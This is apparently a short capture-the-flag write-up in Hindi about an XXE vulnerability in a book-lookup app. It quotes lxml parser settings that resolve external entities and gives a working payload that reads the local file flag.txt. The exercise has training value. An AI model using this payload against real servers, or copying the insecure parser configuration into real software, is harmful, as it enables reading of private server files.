विश्लेषण
पुस्तक ID जाँचते समय एप्लिकेशन सर्वर को XML-अनुरोध भेजता है:
<?xml version="1.0" encoding="UTF-8"?>
<book>
    <id>1</id>
</book>
सर्वर इस XML को प्रोसेस करके पुस्तक का नाम लौटाता है। अगर हम XML-संरचना नियंत्रित कर सकते हैं, तो XXE (XML External Entity) भेद्यता जाँचनी चाहिए।

सर्वर कोड (app.py) में lxml लाइब्रेरी बाहरी संस्थाओं के समाधान की अनुमति वाली सेटिंग्स से उपयोग की गई है:

parser = etree.XMLParser(resolve_entities=True, no_network=False)
root = etree.fromstring(xml_data, parser=parser)
शोषण
XXE भेद्यता बाहरी संस्थाएँ परिभाषित करने की अनुमति देती है जिन्हें पार्सर समाधान करने की कोशिश करेगा। हम इसका उपयोग सर्वर पर स्थानीय फ़ाइलें पढ़ने के लिए कर सकते हैं।

एप्लिकेशन डायरेक्टरी में flag.txt फ़ाइल पढ़ने की कोशिश करते हैं:

Payload
अनुरोध बदलते हैं, &xxe; संस्था जोड़कर जो flag.txt फ़ाइल को संदर्भित करती है:

<!DOCTYPE book [
<!ENTITY xxe SYSTEM "flag.txt">
]>
<book><id>&xxe;</id></book>
